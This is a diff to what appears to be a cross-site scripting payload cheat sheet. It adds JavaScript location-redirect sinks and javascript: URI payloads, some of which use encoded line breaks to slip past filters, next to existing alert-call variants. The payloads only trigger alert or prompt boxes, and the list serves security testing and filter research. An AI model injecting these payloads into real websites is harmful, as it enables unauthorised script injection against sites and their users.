@@ -8,7 +8,9 @@ window.location=
 this["window"]["location"]=
 document.location.href=
 location.href=
-location= 
+location=
+window.location.assign()
+window['location']['href']=
 ```
 
 ### Link
@@ -45,4 +47,11 @@ content['alert'](6)
 [10].filter(alert)
 [11].findIndex(alert)
 [12].forEach(alert);
+```
+## Href
+```
+javascript:alert(1)
+javascript:prompt(1)
+javascript://%0Aalert(1)
+javascript://anything%0D%0A%0D%0Awindow.alert(1)
 ```
